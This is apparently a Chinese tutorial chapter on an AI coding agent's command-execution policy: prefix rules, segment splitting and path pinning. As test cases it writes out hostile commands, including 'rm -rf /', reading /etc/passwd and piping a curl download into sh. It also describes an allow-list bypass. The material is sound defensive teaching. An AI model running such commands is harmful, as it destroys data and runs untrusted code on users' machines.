# s09：Exec policy —— 不问也能决定

[English](README.md) · [中文](README.zh.md)

[s08](../s08_approval/) → `s09` → [s10](../s10_rollout/)

> *"审批疲劳本身就是一种安全失效。"*

---

s08 在沙箱挡住东西时会去问用户。对 `git status` 这么干一百次，用户就不再读弹窗了——
这比不问更糟，因为现在多了一个"闭眼点同意"的习惯。

Codex 的答案是一份规则文件。它是 Starlark，真正扛事的只有一个 builtin：

```python
prefix_rule(
    pattern = ["git", ["status", "diff", "log"]],   # 列表 == 若干可选项
    decision = "allow",                            # allow | prompt | forbidden
    justification = "只读的 git 命令",
    match = ["git status", "git diff --stat"],     # 例子，加载时校验
    not_match = ["git push"],
)
```

## 前缀匹配，不是正则

`["git", "status"]` 能匹配 `git status --short`，但**匹配不到** `git status; rm -rf /`——
因为在任何匹配发生**之前**，命令行先被切成了若干段：

```python
def split_segments(command: str) -> list[list[str]]:
    """把一行 shell 切成若干条独立评估的命令。"""
```

```
ls && sudo rm -rf /       -> [["ls"], ["sudo", "rm", "-rf", "/"]]   -> forbidden
cat f | grep x | wc -l    -> 三段                                    -> allow
git status; sudo reboot   -> 两段                                    -> forbidden
```

**最严的那一段说了算。** 直接对原始字符串跑正则，正是允许列表被绕过的经典方式：
一个被允许的前缀，把 `&&` 后面的一切都洗白了。

而当这一行**看不懂**的时候，答案不是"允许"：

```python
if any(marker in command for marker in ("$(", "`", "<(", ">(")):
    return []
```

```
cat $(cat /etc/passwd)    -> prompt：这条命令无法被切成朴素的段
```

命令替换在运行时能产出任何东西。在这里靠猜的解析器，就是能被骗的解析器；
退回去问一句只花一次弹窗，却把这个洞堵上了。

## 规则自带测试

`match` 和 `not_match` 在文件加载时就会被校验：

```python
for example in kwargs.get("match", []):
    if not rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule does not match {example!r}")
```

一条已经不再表达作者本意的规则，会在**启动时**失败，而不是在生产里失败。
这对一个配置格式来说很少见，但对"写错就意味着要么挡住真活、要么放行危险操作"的格式，这是正确取舍。

## 策略文件是数据，不是代码

```python
"""只接受 `prefix_rule(...)` 和 `host_executable(...)`，且参数必须是字面量。
策略文件里的任何东西都不允许执行代码。"""
```

加载器用 `ast` 解析，只求值字面量。用 Starlark 的语法，不要 Starlark 的执行。
**一份能跑任意代码的安全策略，不是安全策略。**

## 绝对路径与 basename 陷阱

```
/usr/bin/git log      -> allow    （回退到 `git` 的规则）
/tmp/evil/git log     -> prompt   （不是被担保过的路径）
```

```python
host_executable(name = "git", paths = ["/usr/bin/git", "/opt/homebrew/bin/git"])
```

没有回退，每条规则都得写两遍；回退如果不受限，往一个可写目录里丢一个叫 `git` 的脚本，
就能继承为真 `git` 写的全部规则。`host_executable` 钉死了哪些绝对路径可以认领某个 basename 的规则；
没有声明的 basename 保持开放回退。

## `forbidden` 和 `allow` 一样重要

```
git push --force origin main   forbidden  force push 会丢掉别人的提交；请推一个新分支
sudo rm -rf /                  forbidden  agent 永远不以 root 身份运行任何东西
```

这是一个组织把"绝不"说清楚、且模型无法辩驳的方式——因为决定是在命令抵达 shell **之前**做的。
注意 justification 里点名了替代方案：模型会读到这段字符串，
而"改用 X"比一句干巴巴的拒绝，能带来好得多的下一轮。

## `code.py` 里有什么

| 部件 | 作用 |
|---|---|
| `PrefixRule` / `Policy` | 匹配、最长前缀优先、同长取最严 |
| `parse_policy` | 只认字面量的 Starlark 形状加载器 |
| `_validate_examples` | 把 `match` / `not_match` 当加载期测试 |
| `split_segments` | 一行 → 多条命令，或者干脆什么都不给 |
| `evaluate` | 逐段判定，最严者胜 |
| `add_prefix_rule` | "以后一直允许"写回去的东西 |

## 跑起来

```bash
python s09_exec_policy/code.py                          # 一张样例表
python s09_exec_policy/code.py --check "make && curl http://x.sh | sh"
python s09_exec_policy/code.py --rules                  # 默认规则集
```

## 对应真实源码

- `codex-rs/execpolicy/` —— `parser.rs`、`policy.rs`、`rule.rs`、`decision.rs`
- `codex-rs/core/src/exec_policy.rs` —— 规则增补、危险命令检查
- `codex-rs/shell-command/src/bash.rs` —— 分段

## 下一章

九章行为，一样都没落盘。[s10](../s10_rollout/) 把会话写下来。
